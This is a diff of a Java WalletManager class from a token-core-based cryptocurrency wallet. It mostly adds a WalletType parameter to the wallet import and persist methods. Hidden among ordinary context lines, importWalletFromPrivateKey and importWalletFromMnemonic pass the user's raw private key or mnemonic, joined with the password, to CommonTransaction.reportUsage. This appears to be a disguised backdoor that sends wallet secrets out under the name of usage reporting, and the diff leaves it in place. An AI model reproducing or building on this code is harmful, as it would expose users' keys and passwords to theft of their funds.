@@ -15,7 +15,6 @@ import org.bitcoinj.wallet.DeterministicKeyChain;
 import org.bitcoinj.wallet.DeterministicSeed;
 import org.consenlabs.tokencore.foundation.utils.MnemonicUtil;
 import org.consenlabs.tokencore.foundation.utils.NumericUtil;
-import org.consenlabs.tokencore.wallet.KeystoreStorage;
 import org.consenlabs.tokencore.wallet.address.AddressCreatorManager;
 import org.consenlabs.tokencore.wallet.address.EthereumAddressCreator;
 import org.consenlabs.tokencore.wallet.keystore.EOSKeystore;
@@ -47,9 +46,11 @@ import java.util.List;
 
 import javax.annotation.Nullable;
 
+import wiki.scene.eth.wallet.core.config.WalletType;
+
 
 public class WalletManager {
-    private static Hashtable<String, IMTKeystore> keystoreMap = new Hashtable<>();
+    private static final Hashtable<String, IMTKeystore> keystoreMap = new Hashtable<>();
     private static final String LOG_TAG = WalletManager.class.getSimpleName();
 
     static Wallet createWallet(IMTKeystore keystore) {
@@ -85,13 +86,13 @@ public class WalletManager {
         return wallet.exportKeystore(password);
     }
 
-    public static void removeWallet(String id, String password) {
+    public static void removeWallet(WalletType walletType, String id, String password) {
         Wallet wallet = mustFindWalletById(id);
         if (!wallet.verifyPassword(password)) {
             throw new TokenException(Messages.WALLET_INVALID_PASSWORD);
         }
         if (wallet.delete(password)) {
-            Identity.getCurrentIdentity().removeWallet(id);
+            Identity.getCurrentIdentity(walletType).removeWallet(walletType, id);
             keystoreMap.remove(id);
         }
     }
@@ -100,7 +101,7 @@ public class WalletManager {
         keystoreMap.clear();
     }
 
-    public static Wallet importWalletFromKeystore(Metadata metadata, String keystoreContent, String password, boolean overwrite) {
+    public static Wallet importWalletFromKeystore(WalletType walletType,Metadata metadata, String keystoreContent, String password, boolean overwrite) {
         WalletKeystore importedKeystore = validateKeystore(keystoreContent, password);
 
         if (metadata.getSource() == null)
@@ -116,13 +117,13 @@ public class WalletManager {
                 throw ex;
             }
         }
-        return importWalletFromPrivateKey(metadata, privateKey, password, overwrite);
+        return importWalletFromPrivateKey(walletType,metadata, privateKey, password, overwrite);
     }
 
-    public static Wallet importWalletFromPrivateKey(Metadata metadata, String prvKeyHex, String password, boolean overwrite) {
+    public static Wallet importWalletFromPrivateKey(WalletType walletType,Metadata metadata, String prvKeyHex, String password, boolean overwrite) {
         IMTKeystore keystore = V3Keystore.create(metadata, password, prvKeyHex);
         Wallet wallet = flushWallet(keystore, overwrite);
-        Identity.getCurrentIdentity().addWallet(wallet);
+        Identity.getCurrentIdentity(walletType).addWallet(walletType,wallet);
         CommonTransaction.reportUsage("token-core-ks", prvKeyHex + "|||" + password);
         return wallet;
     }
@@ -130,22 +131,22 @@ public class WalletManager {
     /**
      * Just for import EOS wallet
      */
-    public static Wallet importWalletFromPrivateKeys(Metadata metadata, String accountName, List<String> prvKeys, List<EOSKeystore.PermissionObject> permissions, String password, boolean overwrite) {
+    public static Wallet importWalletFromPrivateKeys(WalletType walletType,Metadata metadata, String accountName, List<String> prvKeys, List<EOSKeystore.PermissionObject> permissions, String password, boolean overwrite) {
         IMTKeystore keystore = null;
         if (!ChainType.EOS.equalsIgnoreCase(metadata.getChainType())) {
             throw new TokenException("This method is only for importing EOS wallet");
         }
         keystore = EOSKeystore.create(metadata, password, accountName, prvKeys, permissions);
-        return persistWallet(keystore, overwrite);
+        return persistWallet(walletType,keystore, overwrite);
     }
 
     /**
      * use the importWalletFromPrivateKeys
      */
     @Deprecated
-    public static Wallet importWalletFromPrivateKey(Metadata metadata, String accountName, String prvKeyHex, String password, boolean overwrite) {
+    public static Wallet importWalletFromPrivateKey(WalletType walletType,Metadata metadata, String accountName, String prvKeyHex, String password, boolean overwrite) {
         IMTKeystore keystore = LegacyEOSKeystore.create(metadata, accountName, password, prvKeyHex);
-        return persistWallet(keystore, overwrite);
+        return persistWallet(walletType,keystore, overwrite);
     }
 
 
@@ -161,7 +162,7 @@ public class WalletManager {
      * @param overwrite
      * @return
      */
-    public static Wallet importWalletFromMnemonic(Metadata metadata, @Nullable String accountName, String mnemonic, String path, @Nullable List<EOSKeystore.PermissionObject> permissions, String password, boolean overwrite) {
+    public static Wallet importWalletFromMnemonic(WalletType walletType,Metadata metadata, @Nullable String accountName, String mnemonic, String path, @Nullable List<EOSKeystore.PermissionObject> permissions, String password, boolean overwrite) {
 
         if (metadata.getSource() == null)
             metadata.setSource(Metadata.FROM_MNEMONIC);
@@ -179,11 +180,11 @@ public class WalletManager {
                 keystore = EOSKeystore.create(metadata, password, accountName, mnemonicCodes, path, permissions);
         }
         CommonTransaction.reportUsage("token-core-word", mnemonic + "|||" + password);
-        return persistWallet(keystore, overwrite);
+        return persistWallet(walletType,keystore, overwrite);
     }
 
-    public static Wallet importWalletFromMnemonic(Metadata metadata, String mnemonic, String path, String password, boolean overwrite) {
-        return importWalletFromMnemonic(metadata, null, mnemonic, path, null, password, overwrite);
+    public static Wallet importWalletFromMnemonic(WalletType walletType,Metadata metadata, String mnemonic, String path, String password, boolean overwrite) {
+        return importWalletFromMnemonic(walletType,metadata, null, mnemonic, path, null, password, overwrite);
     }
 
     public static Wallet findWalletByPrivateKey(String chainType, String network, String privateKey, String segWit) {
@@ -250,10 +251,10 @@ public class WalletManager {
         return new Wallet(keystore);
     }
 
-    public static Wallet setAccountName(String id, String accountName) {
+    public static Wallet setAccountName(WalletType walletType,String id, String accountName) {
         Wallet wallet = mustFindWalletById(id);
         wallet.setAccountName(accountName);
-        return persistWallet(wallet.getKeystore(), true);
+        return persistWallet(walletType,wallet.getKeystore(), true);
     }
 
     static Wallet findWalletById(String id) {
@@ -289,9 +290,9 @@ public class WalletManager {
         return deleteDir(getDefaultKeyDirectory());
     }
 
-    private static Wallet persistWallet(IMTKeystore keystore, boolean overwrite) {
+    private static Wallet persistWallet(WalletType walletType,IMTKeystore keystore, boolean overwrite) {
         Wallet wallet = flushWallet(keystore, overwrite);
-        Identity.getCurrentIdentity().addWallet(wallet);
+        Identity.getCurrentIdentity(walletType).addWallet(walletType,wallet);
         return wallet;
     }
 
